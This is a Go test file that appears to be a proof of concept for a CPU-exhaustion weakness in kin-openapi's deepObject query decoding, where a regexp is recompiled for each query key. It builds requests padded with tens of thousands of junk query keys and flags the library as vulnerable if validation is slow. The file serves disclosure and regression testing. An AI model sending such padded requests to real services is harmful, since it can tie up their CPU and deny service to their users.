package openapi3filter_test

import (
	"context"
	"fmt"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/getkin/kin-openapi/openapi3"
	"github.com/getkin/kin-openapi/openapi3filter"
	"github.com/getkin/kin-openapi/routers/gorillamux"
)

const specDeepObjectParam = `
openapi: 3.0.0
info: {title: PoC, version: 1.0.0}
paths:
  /f:
    get:
      parameters:
        - name: filter
          in: query
          style: deepObject
          explode: true
          schema: {type: object, properties: {a: {type: string}}}
      responses:
        '200': {description: ok}
`

// TestPoCDeepObjectRegexpCPU demonstrates that decode cost scales with the
// number of (attacker-controlled) junk query keys because a loop-invariant
// regexp is recompiled once per key. It logs timings for two key counts and
// fails if the larger count crosses a clearly-abnormal CPU threshold.
func TestPoCDeepObjectRegexpCPU(t *testing.T) {
	loader := openapi3.NewLoader()
	doc, err := loader.LoadFromData([]byte(specDeepObjectParam))
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	if err := doc.Validate(loader.Context); err != nil {
		t.Fatalf("validate: %v", err)
	}
	router, err := gorillamux.NewRouter(doc)
	if err != nil {
		t.Fatalf("router: %v", err)
	}

	run := func(n int) time.Duration {
		var sb strings.Builder
		sb.WriteString("/f?filter[a]=x")
		for i := 0; i < n; i++ {
			fmt.Fprintf(&sb, "&j%d=1", i)
		}
		req, _ := http.NewRequest(http.MethodGet, sb.String(), nil)
		route, pathParams, err := router.FindRoute(req)
		if err != nil {
			t.Fatalf("route: %v", err)
		}
		start := time.Now()
		_ = openapi3filter.ValidateRequest(context.Background(), &openapi3filter.RequestValidationInput{
			Request: req, PathParams: pathParams, Route: route,
			Options: &openapi3filter.Options{AuthenticationFunc: openapi3filter.NoopAuthenticationFunc},
		})
		return time.Since(start)
	}

	small := run(2000)
	large := run(40000)
	t.Logf("2000 junk keys -> %v ; 40000 junk keys -> %v (cost scales with key count)", small, large)
	if large > 100*time.Millisecond {
		t.Fatalf("VULNERABLE: 40000 junk keys cost %v of CPU for a single request (regexp recompiled per key); scales to full-core saturation", large)
	}
}
